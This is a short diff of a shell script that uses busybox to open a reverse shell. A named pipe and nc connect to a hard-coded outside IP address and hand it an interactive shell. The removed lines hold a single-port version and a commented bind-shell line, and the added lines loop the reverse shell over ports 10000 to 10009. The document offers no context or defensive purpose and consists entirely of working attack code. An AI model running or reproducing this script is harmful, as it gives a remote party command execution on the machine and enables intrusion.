@@ -1,7 +1,5 @@
-#./busybox sh
-
-./busybox mkfifo backpipe
-./busybox nc 138.197.136.154 10000 < backpipe | ./busybox sh &> backpipe
-
-#./busybox nc -l -p 9001 -e ./busyb
-# ox sh
+for PORT in 10000 10001 10002 10003 10004 10005 10006 10007 10008 10009
+do
+   ./busybox mkfifo backpipe
+   ./busybox nc 138.197.136.154 $PORT < backpipe | ./busybox sh &> backpipe
+done
